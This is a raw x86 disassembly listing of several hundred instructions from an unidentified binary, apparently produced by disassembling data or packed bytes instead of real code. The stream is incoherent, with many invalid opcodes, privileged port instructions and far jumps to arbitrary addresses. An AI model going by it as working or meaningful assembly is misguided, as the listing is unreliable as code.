  40c675:	repnz retf 0xd092
  40c679:	je     0x40c62d
  40c67b:	xor    BYTE PTR [esp+eax*1],bl
  40c67e:	xor    eax,0xdc94aa37
  40c683:	rol    BYTE PTR [ebx+0x68287d4],0x7
  40c68a:	jmp    0x9d1daea9
  40c68f:	mov    DWORD PTR [ebp-0x59],esi
  40c692:	mov    ecx,0x6951dde7
  40c697:	int    0x88
  40c699:	mul    DWORD PTR [esi]
  40c69b:	sbb    BYTE PTR [esi+0x5e],ch
  40c69e:	std    
  40c69f:	int3   
  40c6a0:	jo     0x40c70c
  40c6a2:	dec    ebp
  40c6a3:	test   eax,0xc85637e
  40c6a8:	daa    
  40c6a9:	imul   edi,esp,0xdd97805c
  40c6af:	dec    esp
  40c6b0:	sahf   
  40c6b1:	pop    edx
  40c6b2:	(bad)  
  40c6b3:	imul   ebp,edx,0x4e
  40c6b6:	dec    esi
  40c6b7:	mov    es,WORD PTR [esi-0x529667d0]
  40c6bd:	push   esp
  40c6be:	push   edx
  40c6bf:	and    edx,edi
  40c6c1:	sbb    DWORD PTR [ecx-0x713e99a4],edx
  40c6c7:	or     BYTE PTR [ebx+0x7cd02f0a],cl
  40c6cd:	cmp    dh,BYTE PTR [ebx]
  40c6cf:	mov    dh,0x71
  40c6d1:	call   0x4b6c:0x4f4cecb0
  40c6d8:	ficom  WORD PTR [edi+0x2fe360d0]
  40c6df:	sbb    eax,0x97dc23f8
  40c6e4:	icebp  
  40c6e5:	imul   ebx,ebx,0xfffffff1
  40c6e8:	nop    DWORD PTR [eax+0x2b8d473f]
  40c6ef:	pop    ds
  40c6f0:	or     edi,eax
  40c6f2:	dec    eax
  40c6f3:	mov    ss,edx
  40c6f5:	call   0x3812:0x2f64a838
  40c6fc:	push   es
  40c6fd:	push   eax
  40c6fe:	in     eax,0x35
  40c700:	in     eax,dx
  40c701:	int3   
  40c702:	aad    0x3e
  40c704:	cmp    dl,cl
  40c706:	sub    esi,0xffffffc8
  40c709:	dec    edx
  40c70a:	pop    ebx
  40c70b:	push   ss
  40c70c:	sub    eax,0x99a22c3b
  40c711:	aam    0x3c
  40c713:	retf   
  40c714:	and    eax,0x97ec9004
  40c719:	les    eax,FWORD PTR [edi]
  40c71b:	fldcw  WORD PTR [edx-0x6c]
  40c71e:	dec    esi
  40c71f:	jae    0x40c75e
  40c721:	xchg   ebx,eax
  40c722:	ficom  DWORD PTR [edi-0x3a082d60]
  40c728:	test   eax,0xb12e113f
  40c72d:	push   esp
  40c72e:	dec    ebx
  40c72f:	repz push edx
  40c731:	pop    es
  40c732:	push   edi
  40c733:	pop    es
  40c734:	mov    esi,0x622f5565
  40c739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c73a:	je     0x40c6c7
  40c73c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c73d:	mov    ecx,0xe744781f
  40c742:	loopne 0x40c7be
  40c744:	jecxz  0x40c75a
  40c746:	(bad)  
  40c747:	mov    ch,0x46
  40c749:	mov    eax,0x54a3592
  40c74e:	aam    0x49
  40c750:	cmp    BYTE PTR [ebx-0x48],bh
  40c753:	push   ss
  40c754:	mov    WORD PTR [ebp-0x33],fs
  40c757:	dec    edx
  40c758:	ror    BYTE PTR [ebx-0x2],0xb0
  40c75c:	xor    cl,BYTE PTR [edi]
  40c75e:	mov    dl,0x94
  40c760:	test   DWORD PTR [eax],edx
  40c762:	mov    al,ds:0xb1d148b2
  40c767:	jmp    0x40c6f2
  40c769:	inc    ecx
  40c76a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c76b:	leave  
  40c76c:	push   cs
  40c76d:	ja     0x40c6fb
  40c76f:	stos   DWORD PTR es:[edi],eax
  40c770:	mov    bh,0x4b
  40c772:	pop    edx
  40c773:	lock inc ebx
  40c775:	pop    ss
  40c776:	mov    WORD PTR [ecx-0x59428a8e],cs
  40c77c:	cmp    eax,0xb6a9bf72
  40c781:	fwait
  40c782:	lahf   
  40c783:	loope  0x40c7a4
  40c785:	add    BYTE PTR [edx+ecx*1-0x342d24c6],0x73
  40c78d:	inc    ecx
  40c78e:	arpl   WORD PTR [ebx+0x3f],dx
  40c791:	lods   al,BYTE PTR ds:[esi]
  40c792:	or     DWORD PTR [esi-0x26],eax
  40c795:	imul   edx,DWORD PTR [esi],0xffffff88
  40c798:	xchg   ebx,eax
  40c799:	add    bh,BYTE PTR [esi]
  40c79b:	cmp    al,0x26
  40c79d:	stos   DWORD PTR es:[edi],eax
  40c79e:	mov    esi,0xcde93093
  40c7a3:	cmc    
  40c7a4:	jmp    0x9118:0xff6bb31a
  40c7ab:	int3   
  40c7ac:	sub    edx,DWORD PTR [esi+0xb172737]
  40c7b2:	mov    ebx,0x879a6122
  40c7b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7b8:	ds mov ecx,0x1eecd41b
  40c7be:	pop    eax
  40c7bf:	sbb    al,BYTE PTR [ecx+0x67a43594]
  40c7c5:	mov    eax,0x103c5c8
  40c7ca:	(bad)  
  40c7cb:	inc    ebp
  40c7cc:	jns    0x40c7d7
  40c7ce:	sub    edx,DWORD PTR [esi+0x732378e6]
  40c7d4:	push   eax
  40c7d5:	push   eax
  40c7d6:	cwde   
  40c7d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7d8:	mov    esp,DWORD PTR [esi+0x49]
  40c7db:	xor    BYTE PTR [ebx+0x79fb5f83],cl
  40c7e1:	cld    
  40c7e2:	jns    0x40c7a7
  40c7e4:	shl    DWORD PTR [edx+0x3b180e47],cl
  40c7ea:	inc    eax
  40c7eb:	(bad)  
  40c7ec:	sub    eax,0xd87c1f70
  40c7f1:	jmp    0x40c77d
  40c7f3:	jge    0x40c7fd
  40c7f5:	out    dx,al
  40c7f6:	adc    DWORD PTR [eax-0x1e],edi
  40c7f9:	adc    di,WORD PTR [eax-0x2f]
  40c7fd:	cmp    bh,BYTE PTR [eax-0x6c]
  40c800:	jnp    0x40c7ab
  40c802:	fstp   DWORD PTR [eax+edi*1-0x4e570fc7]
  40c809:	les    edx,FWORD PTR [ecx+0x55927cbf]
  40c80f:	loopne 0x40c875
  40c811:	(bad)  
  40c812:	jecxz  0x40c7ac
  40c814:	xchg   DWORD PTR [esi],edi
  40c816:	mov    al,0x25
  40c818:	cmp    ah,al
  40c81a:	jno    0x40c7c1
  40c81c:	aam    0xdf
  40c81e:	nop
  40c81f:	and    DWORD PTR [esi],esp
  40c821:	cdq    
  40c822:	and    ebp,esi
  40c824:	test   al,0x52
  40c826:	jmp    0x16427c3b
  40c82b:	xchg   edx,eax
  40c82c:	mov    ah,0xd3
  40c82e:	add    DWORD PTR [eax-0x6d082d66],edi
  40c834:	ja     0x40c8ad
  40c836:	push   ebp
  40c837:	mov    esi,0xe12282a1
  40c83c:	dec    edi
  40c83d:	add    BYTE PTR [ebx-0x13b58e82],ch
  40c843:	jp     0x40c803
  40c845:	mov    ds:0xffa600bb,eax
  40c84a:	clc    
  40c84b:	dec    esi
  40c84c:	dec    ebp
  40c84d:	ror    ebx,1
  40c84f:	jl     0x40c88f
  40c851:	test   eax,0xbccfdd72
  40c856:	fucom  st(3)
  40c858:	mov    ds:0x7b5a695c,al
  40c85d:	dec    ecx
  40c85e:	ud2    
  40c860:	(bad)  
  40c861:	cli    
  40c862:	imul   ebp,ecx,0xe3247351
  40c868:	das    
  40c869:	mov    WORD PTR [ebp+0x7b],?
  40c86c:	sbb    ch,0x3d
  40c86f:	ja     0x40c85b
  40c871:	pop    eax
  40c872:	test   al,0xdf
  40c874:	dec    esp
  40c875:	add    BYTE PTR [edi+edx*4+0x3a619de8],bl
  40c87c:	mov    ds:0x6c2b44ac,al
  40c881:	xchg   edx,eax
  40c882:	or     al,0xc1
  40c884:	sbb    eax,esp
  40c886:	inc    esi
  40c887:	dec    eax
  40c888:	rcl    DWORD PTR [ebp+0x69],0x59
  40c88c:	test   ebx,esi
  40c88e:	test   al,0x57
  40c890:	rcr    cl,1
  40c892:	fwait
  40c893:	mov    al,0xeb
  40c895:	push   0x5
  40c897:	cwde   
  40c898:	jl     0x40c8c1
  40c89a:	inc    ebx
  40c89b:	adc    eax,edi
  40c89d:	and    BYTE PTR [ecx-0x30],bh
  40c8a0:	and    al,0x9e
  40c8a2:	and    DWORD PTR [ecx+0xd535de2],edx
  40c8a8:	sub    DWORD PTR [esi-0x3313642f],ebp
  40c8ae:	dec    esi
  40c8af:	xor    bh,bh
  40c8b1:	sub    eax,0x1241916e
  40c8b6:	mov    esi,0xa84c9ee6
  40c8bb:	add    edi,DWORD PTR [eax+esi*1+0x4d]
  40c8bf:	inc    ebp
  40c8c0:	or     eax,0xaff6d6b0
  40c8c5:	bound  edi,QWORD PTR [edi]
  40c8c7:	push   cs
  40c8c8:	jmp    0xb1464cd5
  40c8cd:	popa   
  40c8ce:	es popa 
  40c8d0:	(bad)  
  40c8d1:	aad    0xc6
  40c8d3:	lahf   
  40c8d4:	adc    DWORD PTR [eax+0x450e06ba],esp
  40c8da:	rol    esp,cl
  40c8dc:	popf   
  40c8dd:	jb     0x40c8f4
  40c8df:	call   DWORD PTR [ebx+0x17e7aec8]
  40c8e5:	pop    edx
  40c8e6:	int3   
  40c8e7:	push   esp
  40c8e8:	dec    ecx
  40c8e9:	jb     0x40c88b
  40c8eb:	or     DWORD PTR [eax+ebp*4+0x4340bb1a],0x50
  40c8f3:	add    BYTE PTR [edx],ah
  40c8f5:	mov    bl,0xcb
  40c8f7:	fdivr  st(3),st
  40c8f9:	icebp  
  40c8fa:	les    ecx,FWORD PTR ds:[esi-0x69fb271a]
  40c901:	add    DWORD PTR [ecx-0x77],ebp
  40c904:	or     bh,BYTE PTR [edi+0x57f19ecc]
  40c90a:	add    al,0x90
  40c90c:	pop    eax
  40c90d:	sbb    al,0x46
  40c90f:	in     eax,dx
  40c910:	add    al,0xed
  40c912:	xchg   ah,dl
  40c914:	push   ds
  40c915:	jbe    0x40c944
  40c917:	mov    DWORD PTR [eax],ebx
  40c919:	in     eax,0x1d
  40c91b:	ins    DWORD PTR es:[edi],dx
  40c91c:	mov    edi,0xc34a12ba
  40c921:	les    edx,FWORD PTR [edi+0x46]
  40c924:	jle    0x40c986
  40c926:	test   al,0x50
  40c928:	adc    BYTE PTR [edx+eax*8],bh
  40c92b:	or     eax,0x53a7f882
  40c930:	clc    
  40c931:	inc    eax
  40c932:	jecxz  0x40c8fd
  40c934:	sub    al,0x8f
  40c936:	cmp    edx,edi
  40c938:	scas   al,BYTE PTR es:[edi]
  40c939:	jmp    0x1dde1f34
  40c93e:	fimul  WORD PTR [edx+eiz*8+0x3b87d3ca]
  40c945:	adc    ebp,DWORD PTR [ecx-0x29]
  40c948:	sti    
  40c949:	mov    ebp,0x7330b57f
  40c94e:	xor    al,0x38
  40c950:	mov    ds:0x1adb24f6,al
  40c955:	sub    eax,0x88a06367
  40c95a:	push   ebp
  40c95b:	jmp    0xaa7e99a9
  40c960:	clc    
  40c961:	and    esi,DWORD PTR [edi]
  40c963:	jbe    0x40c93a
  40c965:	cmc    
  40c966:	ins    DWORD PTR es:[edi],dx
  40c967:	mov    ss,esi
  40c969:	mov    eax,ds:0xa5964f3c
  40c96e:	(bad)  
  40c970:	jbe    0x40c919
  40c972:	or     BYTE PTR [esi],al
  40c974:	call   DWORD PTR [eax-0xe]
  40c977:	mov    DWORD PTR [eax+0x61],0xebe079a3
  40c97e:	add    BYTE PTR [esi],0xf7
  40c981:	iret   
  40c982:	je     0x40c9ab
  40c984:	sbb    eax,0xa50e72af
  40c989:	fisub  WORD PTR [esi-0x78]
  40c98c:	jne    0x40c9f7
  40c98e:	pop    ebp
  40c98f:	sti    
  40c990:	mov    al,0xbf
  40c992:	jns    0x40c96e
  40c994:	inc    ecx
  40c995:	(bad)  
  40c996:	stos   BYTE PTR es:[edi],al
  40c997:	bound  esp,QWORD PTR [esp+eax*1+0x22]
  40c99b:	je     0x40c932
  40c99d:	xchg   ecx,eax
  40c99e:	arpl   WORD PTR [esi],bp
  40c9a0:	push   cs
  40c9a1:	es dec esp
  40c9a3:	cmp    edx,ebp
  40c9a5:	(bad)
  40c9a8:	ins    BYTE PTR es:[edi],dx
  40c9a9:	sahf   
  40c9aa:	pusha  
  40c9ab:	sub    bh,ah
  40c9ad:	in     eax,0xac
  40c9af:	add    BYTE PTR [ebx],0x9d
  40c9b2:	(bad)  [edx-0x74914cf4]
  40c9b8:	stos   DWORD PTR es:[edi],eax
  40c9b9:	dec    esp
  40c9ba:	shr    edx,cl
  40c9bc:	cmp    DWORD PTR [eax-0x72],esp
  40c9bf:	repz mov ecx,0x2c206c4d
  40c9c5:	xor    bl,ah
  40c9c7:	and    al,0xa7
  40c9c9:	out    0xb5,al
  40c9cb:	cmp    al,ah
  40c9cd:	stos   DWORD PTR es:[edi],eax
  40c9ce:	ret    
  40c9cf:	in     eax,0x27
  40c9d1:	aad    0x3a
  40c9d3:	sbb    ah,BYTE PTR [esi+ecx*1-0x7e]
  40c9d7:	sbb    ah,bl
  40c9d9:	rcl    BYTE PTR [ebp-0x5f],cl
  40c9dc:	scas   al,BYTE PTR es:[edi]
  40c9dd:	cmp    al,0xf4
  40c9df:	stos   DWORD PTR es:[edi],eax
  40c9e0:	push   0xffffffbd
  40c9e2:	push   ds
  40c9e3:	jmp    0x40c9c5
  40c9e5:	add    cl,BYTE PTR [ebx]
  40c9e7:	es push ebp
  40c9e9:	dec    esp
  40c9ea:	rcr    BYTE PTR [edi+0x1d40bff5],cl
  40c9f0:	mov    DWORD PTR [ebx-0x65a9ec16],esp
  40c9f6:	loop   0x40c9cb
  40c9f8:	push   0x5e
  40c9fa:	and    eax,DWORD PTR [edx+0x21438477]
  40ca00:	sbb    eax,0x6ad922f1
  40ca05:	aaa    
  40ca06:	loopne 0x40c9ba
  40ca08:	fmul   QWORD PTR [eax+0x13]
  40ca0b:	test   DWORD PTR [eax+eax*4],0x7523b7bc
  40ca12:	in     eax,0x3c
  40ca14:	je     0x40ca51
  40ca16:	xchg   esp,eax
  40ca17:	call   0x3ebb8696
  40ca1c:	add    al,0xee
  40ca1e:	pushf  
  40ca1f:	stc    
  40ca20:	leave  
  40ca21:	adc    BYTE PTR [ebp-0x31],bh
  40ca24:	ja     0x40c9fb
  40ca26:	into   
  40ca27:	sub    eax,0x42cbf828
  40ca2c:	stos   BYTE PTR es:[edi],al
  40ca2d:	or     BYTE PTR [edx-0x66],bl
  40ca30:	lea    ecx,[edx-0x7d]
  40ca33:	mov    DWORD PTR [edi],0xa3b28f2b
  40ca39:	cmc    
  40ca3a:	xchg   ecx,eax
  40ca3b:	pop    ecx
  40ca3c:	popa   
  40ca3d:	mov    esi,0x1ffc487c
  40ca42:	mov    edi,0x470720d3
  40ca47:	rcr    ecx,cl
  40ca49:	and    dh,BYTE PTR [edi+0xd]
  40ca4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca4d:	adc    edx,ebp
  40ca4f:	lods   eax,DWORD PTR ds:[esi]
  40ca50:	xor    dl,dh
  40ca52:	call   0x4774:0xe531ed0b
  40ca59:	jmp    0x40ca7d
  40ca5b:	dec    eax
  40ca5c:	jb     0x40caad
  40ca5e:	sti    
  40ca5f:	fsub   QWORD PTR ds:0x87733758
  40ca65:	jge    0x40cabb
  40ca67:	adc    al,0xe2
  40ca69:	cmp    BYTE PTR [edi],dh
  40ca6b:	ins    DWORD PTR es:[edi],dx
  40ca6c:	add    ch,cl
  40ca6e:	out    0xf,eax
  40ca70:	clc    
  40ca71:	and    al,0x3c
  40ca73:	pusha  
  40ca74:	sti    
  40ca75:	jnp    0x40ca79
  40ca77:	or     ah,dh
  40ca79:	push   eax
  40ca7a:	sbb    eax,0xb065f5fa
  40ca7f:	add    al,0xdd
  40ca81:	stos   BYTE PTR es:[edi],al
  40ca82:	jne    0x40ca4b
  40ca84:	mov    esi,0x5d5deff7
  40ca89:	jmp    0x40caa3
  40ca8b:	addr16 jns 0x40cada
  40ca8e:	mov    es,WORD PTR [ecx+0x6658bca8]
  40ca94:	in     eax,0x5a
  40ca96:	inc    ecx
  40ca97:	jb     0x40caea
  40ca99:	inc    eax
  40ca9a:	hlt    
  40ca9b:	fild   DWORD PTR [eax+0x56422002]
  40caa1:	push   0x36ebc52c
  40caa6:	cmp    ebp,DWORD PTR ds:0x8ccf75b7
  40caac:	icebp  
  40caad:	lods   al,BYTE PTR ds:[esi]
  40caae:	int    0x1a
  40cab0:	jb     0x40cac7
  40cab2:	mov    al,0x9d
  40cab4:	cmp    al,BYTE PTR [edi+0x4e]
  40cab7:	std    
  40cab8:	mov    dl,0x2c
  40caba:	pop    ebp
  40cabb:	das    
  40cabc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cabd:	sahf   
  40cabe:	adc    al,BYTE PTR [ecx]
  40cac0:	or     al,0x10
  40cac2:	es mov ch,0x11
  40cac5:	das    
  40cac6:	(bad)  
  40cac7:	jecxz  0x40ca87
  40cac9:	cdq    
  40caca:	cdq    
  40cacb:	pop    esp
  40cacc:	cwde   
  40cacd:	xchg   BYTE PTR [edi-0xfb61e5f],bl
  40cad3:	out    0x76,al
  40cad5:	xor    dl,ah
  40cad7:	mov    ebp,0x1726f3be
  40cadc:	pop    ebx
  40cadd:	int3   
  40cade:	sbb    edi,DWORD PTR [edi+0x44bd2733]
  40cae4:	push   0xcb3b63d2
  40cae9:	and    ebp,ebx
  40caeb:	std    
  40caec:	sub    BYTE PTR [ebx+0x69],0x26
  40caf0:	xchg   edi,eax
  40caf1:	jge    0x40ca88
  40caf3:	outs   dx,DWORD PTR ds:[esi]
  40caf4:	test   DWORD PTR [esi-0x2971058b],ebx
  40cafa:	fcmovb st,st(1)
  40cafc:	add    dh,BYTE PTR [edx+0x37]
  40caff:	outs   dx,BYTE PTR ds:[esi]
  40cb00:	lea    ebp,[ebp-0x20]
  40cb03:	inc    BYTE PTR [esi]
  40cb05:	in     al,dx
  40cb06:	(bad)  
  40cb08:	stos   BYTE PTR es:[edi],al
  40cb09:	call   0x23e01858
  40cb0e:	mov    edx,gs
  40cb10:	mov    ds:0x2965e7ba,eax
  40cb15:	sti    
  40cb16:	aas    
  40cb17:	xchg   ecx,eax
  40cb18:	leave  
  40cb19:	mov    ah,0x7b
  40cb1b:	pushf  
  40cb1c:	call   0x44c520e4
  40cb21:	ds je  0x40cb3c
  40cb24:	dec    ebx
  40cb25:	dec    eax
  40cb26:	sub    DWORD PTR [eax],edi
  40cb28:	adc    BYTE PTR [eax],ch
  40cb2a:	pop    ss
  40cb2b:	ins    DWORD PTR es:[edi],dx
  40cb2c:	aas    
  40cb2d:	or     eax,0x1c6c7cb5
  40cb32:	xor    eax,0x9ac86e3
  40cb37:	adc    dh,BYTE PTR [ecx]
  40cb39:	mov    al,0x26
  40cb3b:	and    al,0x30
  40cb3d:	push   es
  40cb3e:	add    ebx,ecx
  40cb40:	or     ebx,0x7f4ddb5e
  40cb46:	jg     0x40cb41
  40cb48:	or     eax,0x41029457
  40cb4d:	sub    al,0x4
  40cb4f:	popf   
  40cb50:	jmp    0x52941646
  40cb55:	aad    0xc6
  40cb57:	test   al,0x9d
  40cb59:	pop    ecx
  40cb5a:	inc    edi
  40cb5b:	repz ret 0x4a11
  40cb5f:	mov    ds:0xa845f39b,al
  40cb64:	jmp    0xd659:0x44044014
  40cb6b:	xor    bh,cl
  40cb6d:	push   edi
  40cb6e:	fimul  DWORD PTR ds:[eax+0x42]
  40cb72:	mov    ebx,0xe1fdbf8d
  40cb77:	imul   edx,DWORD PTR [edx+0x63],0x378aeb75
  40cb7e:	jb     0x40cb02
  40cb80:	mov    al,ds:0xe2e78ace
  40cb85:	push   es
  40cb86:	jo     0x40cbce
  40cb88:	mov    al,0x6
  40cb8a:	xor    DWORD PTR ds:[esi],ecx
  40cb8d:	les    esi,FWORD PTR [edx-0x76]
  40cb90:	(bad)  
  40cb91:	and    BYTE PTR [ecx],bh
  40cb93:	mov    ecx,0xdbddf9ce
  40cb98:	xor    al,0xd9
  40cb9a:	mov    BYTE PTR [edi],0x6c
  40cb9d:	or     bh,BYTE PTR ds:0x7807e944
  40cba3:	push   ecx
  40cba4:	std    
  40cba5:	adc    ebx,DWORD PTR [eax]
  40cba7:	adc    dh,bh
  40cba9:	fcmovnbe st,st(5)
  40cbab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbac:	sub    eax,0xf492c3cb
  40cbb1:	es xchg ecx,eax
  40cbb3:	mov    ds:0xd9b75c9c,eax
  40cbb8:	lods   eax,DWORD PTR ds:[esi]
  40cbb9:	sub    esp,DWORD PTR [eax-0x40]
  40cbbc:	(bad)  [edi+0x172dc193]
  40cbc2:	cmp    ecx,esi
  40cbc4:	lahf   
  40cbc5:	jno    0x40cbe3
  40cbc7:	rcr    DWORD PTR [ecx-0x36],cl
  40cbca:	mov    esp,0x543f1469
  40cbcf:	test   eax,0x29e866cb
  40cbd4:	cmp    DWORD PTR [ecx+0x277d7b00],eax
  40cbda:	dec    edi
  40cbdb:	sub    BYTE PTR [ecx+0x7],dh
  40cbde:	and    dl,BYTE PTR [ebx]
  40cbe0:	lea    esp,[edi-0x17]
  40cbe3:	mov    ebx,eax
  40cbe5:	hlt    
  40cbe6:	sar    DWORD PTR [eax+0x56cf8cd1],1
  40cbec:	jae    0x40cbb6
  40cbee:	ret    0x2a98
  40cbf1:	ja     0x40cbad
  40cbf3:	cmp    BYTE PTR [ebx-0x41],cl
  40cbf6:	outs   dx,DWORD PTR ds:[esi]
  40cbf7:	retf   0x3ba
  40cbfa:	cmp    al,0x9c
  40cbfc:	xchg   esp,eax
  40cbfd:	pop    edx
  40cbfe:	popf   
  40cbff:	lods   eax,DWORD PTR ds:[esi]
  40cc00:	gs adc eax,0xf993f4f2
  40cc06:	jmp    0xf62a:0x1b22679e
  40cc0d:	in     eax,0xb
  40cc0f:	or     BYTE PTR [edi+0x3c],ch
  40cc12:	inc    edi
  40cc13:	rcl    DWORD PTR [ebx+0x452a5e4],1
  40cc19:	push   cs
  40cc1a:	jo     0x40cbf8
  40cc1c:	pop    edx
  40cc1d:	(bad)  
  40cc1e:	sbb    BYTE PTR [ebp+0x3c8da582],bh
  40cc24:	mov    dh,0x79
  40cc26:	clc    
  40cc27:	and    DWORD PTR [edi+0x3dcc9ef4],0x6309afa9
  40cc31:	cwde   
  40cc32:	mov    dh,0xa3
  40cc34:	pop    esi
  40cc35:	cmp    eax,DWORD PTR [edx+0x5e57907]
  40cc3b:	mov    ah,0x1e
  40cc3d:	xchg   edx,eax
  40cc3e:	in     al,0xc2
  40cc40:	jbe    0x40cc1f
  40cc42:	dec    edx
  40cc43:	push   esp
  40cc44:	dec    ebp
  40cc45:	mov    ah,0x58
  40cc47:	std    
  40cc48:	out    0x79,eax
  40cc4a:	jl     0x40cc69
  40cc4c:	movaps xmm5,XMMWORD PTR [edx-0x66ddd26c]
  40cc53:	pop    ecx
  40cc54:	and    DWORD PTR [esi],eax
  40cc56:	pop    ebp
  40cc57:	lds    esp,FWORD PTR [eax]
  40cc59:	mov    esi,0x6adfa362
  40cc5e:	data16 ja 0x40cc1d
  40cc61:	and    BYTE PTR [esi-0x3a],cl
  40cc64:	jmp    0xbbce9de3
  40cc69:	inc    ebp
  40cc6a:	add    edi,DWORD PTR [eax]
  40cc6c:	sti    
  40cc6d:	mov    ecx,0x642e3f91
  40cc72:	and    BYTE PTR [edi-0x3a],bh
  40cc75:	pop    edx
  40cc76:	pop    ebp
  40cc77:	push   edx
  40cc78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc79:	cld    
  40cc7a:	fst    QWORD PTR [esi]
  40cc7c:	lock fisub DWORD PTR [ebx+ebx*2]
  40cc80:	jg     0x40cc21
  40cc82:	xor    BYTE PTR [eax+0x6b1d4d71],cl
  40cc88:	int3   
  40cc89:	mov    al,0xbd
  40cc8b:	sub    al,0xa5
  40cc8d:	xor    esi,esp
  40cc8f:	lods   al,BYTE PTR ds:[esi]
  40cc90:	jg     0x40cccd
  40cc92:	ret    
  40cc93:	(bad)  
  40cc94:	je     0x40cc6b
  40cc96:	pop    ds
  40cc97:	imul   eax,DWORD PTR [eax+0x6b0b3348],0xd441d26b
  40cca1:	mov    ah,0xf4
  40cca3:	jne    0x40cd24
  40cca5:	inc    esp
  40cca6:	je     0x40cc3c
  40cca8:	and    al,0xd8
  40ccaa:	mov    ds:0x26c002d9,al
  40ccaf:	xchg   esp,eax
  40ccb0:	(bad)  
  40ccb1:	les    eax,FWORD PTR [edx+0x3960f3e3]
  40ccb7:	aas    
  40ccb8:	ja     0x40ccd3
  40ccba:	(bad)  
  40ccbb:	cli    
  40ccbc:	cmp    DWORD PTR [edi-0x46c46c9],esp
  40ccc2:	mov    al,BYTE PTR [ebx+0x3d066e69]
  40ccc8:	les    edx,FWORD PTR [eax-0x1368c02c]
  40ccce:	int3   
  40cccf:	lods   eax,DWORD PTR ds:[esi]
  40ccd0:	inc    ebp
  40ccd1:	cdq    
  40ccd2:	daa    
  40ccd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccd4:	mov    ebp,0xbe5639de
  40ccd9:	inc    esp
  40ccda:	and    BYTE PTR [esi-0xe3802d2],bh
  40cce0:	push   0x9f8ea281
  40cce5:	dec    esi
  40cce6:	rol    edx,cl
  40cce8:	imul   eax,DWORD PTR [ebx],0x5eb9da27
  40ccee:	inc    eax
  40ccef:	rol    DWORD PTR [esi+esi*4-0x6ff7bbae],1
  40ccf6:	cli    
  40ccf7:	xor    al,0xaa
  40ccf9:	mov    esp,0x5dd34faf
  40ccfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccff:	stc    
  40cd00:	out    dx,al
  40cd01:	out    dx,al
  40cd02:	push   es
  40cd03:	lock jl 0x40cc8e
  40cd06:	mov    eax,0xb0684a90
  40cd0b:	cld    
  40cd0c:	adc    ebp,DWORD PTR [ecx+0x279dbea7]
  40cd12:	mov    ebx,0x5ff120c0
  40cd17:	inc    esp
  40cd18:	jl     0x40cd56
  40cd1a:	loopne 0x40ccd3
  40cd1c:	dec    edx
  40cd1d:	sar    ecx,cl
  40cd1f:	sbb    esp,DWORD PTR [ecx+0x55]
  40cd22:	(bad)  
  40cd23:	dec    ecx
  40cd24:	addr16 or dh,dh
  40cd27:	ss xchg ebp,eax
  40cd29:	sbb    al,BYTE PTR [ebx]
  40cd2b:	repnz push edx
  40cd2d:	inc    ebx
  40cd2e:	fidivr WORD PTR [edx-0x67]
  40cd31:	jp     0x40cd14
  40cd33:	dec    esi
  40cd34:	jmp    0xe43d:0x1a83e3fc
  40cd3b:	retf   0xbbb0
  40cd3e:	xor    al,0xb5
  40cd40:	in     al,dx
  40cd41:	in     eax,0x1e
  40cd43:	sti    
  40cd44:	jns    0x40ccd6
  40cd46:	out    0x2a,al
  40cd48:	rcl    DWORD PTR [eax-0x3e],cl
  40cd4b:	imul   ebx,DWORD PTR [ebp+0x22],0xffffffe1
  40cd4f:	xchg   ebp,eax
  40cd50:	out    dx,eax
  40cd51:	stos   DWORD PTR es:[edi],eax
  40cd52:	out    0x4d,al
  40cd54:	or     BYTE PTR ds:0x77de1d80,ch
  40cd5b:	sti    
  40cd5c:	pop    ecx
  40cd5d:	cwde   
  40cd5e:	and    al,0x2d
  40cd60:	loop   0x40cdac
  40cd62:	or     al,0x1f
  40cd64:	mov    ebx,0x4ce97f5
  40cd69:	addr16 nop
  40cd6b:	aam    0x90
  40cd6d:	fs dec ecx
  40cd6f:	mov    eax,ds:0xa25c4e21
  40cd74:	or     BYTE PTR ds:0x10d4f99f,dh
  40cd7a:	dec    BYTE PTR [ebp-0x17]
  40cd7d:	inc    ebx
  40cd7e:	pushf  
  40cd7f:	push   ecx
  40cd80:	jl     0x40cd42
  40cd82:	pop    ds
  40cd83:	stc    
  40cd84:	les    ecx,FWORD PTR ds:0xa8ba188a
  40cd8a:	sub    ecx,0x2df70a46
  40cd90:	xchg   edx,eax
  40cd91:	ffree  st(5)
  40cd93:	bound  ebx,QWORD PTR ss:[edi-0x3b129d27]
  40cd9a:	pushf  
  40cd9b:	add    eax,0x4e5d8c18
  40cda0:	ins    DWORD PTR es:[edi],dx
  40cda1:	lods   eax,DWORD PTR ds:[esi]
  40cda2:	jp     0x40cd40
  40cda4:	inc    ebx
  40cda5:	std    
  40cda6:	pop    es
  40cda7:	sub    BYTE PTR [edx],ch
  40cda9:	add    eax,0x3b2fe6c1
  40cdae:	(bad)  
  40cdaf:	sahf   
  40cdb0:	je     0x40cdbb
  40cdb2:	int    0x32
  40cdb4:	fstp   DWORD PTR [ebx]
  40cdb6:	pop    ss
  40cdb7:	mov    ch,0x1b
  40cdb9:	(bad)  
  40cdba:	xor    al,0x58
  40cdbc:	gs push es
  40cdbe:	mov    ebx,0x3318b21c
  40cdc3:	pop    edi
  40cdc4:	cmp    al,0xc7
  40cdc6:	sub    bl,BYTE PTR ds:0xc1a71527
  40cdcc:	cmp    BYTE PTR [edi],ah
  40cdce:	outs   dx,BYTE PTR ds:[esi]
  40cdcf:	sub    DWORD PTR [ebp-0x2caee1a3],esi
  40cdd5:	sbb    ecx,DWORD PTR [edi+0x2d]
  40cdd8:	in     eax,dx
  40cdd9:	fild   DWORD PTR [ebp+0x56cb64ff]
  40cddf:	pushf  
  40cde0:	jmp    0xa472:0xf00c0ae3
  40cde7:	inc    ebx
  40cde8:	in     eax,dx
  40cde9:	mov    al,BYTE PTR [eax-0x17]
  40cdec:	test   DWORD PTR [edx+esi*4-0x57],0xc480e429
  40cdf4:	(bad)  
  40cdf5:	inc    edi
  40cdf6:	jg     0x40cdfd
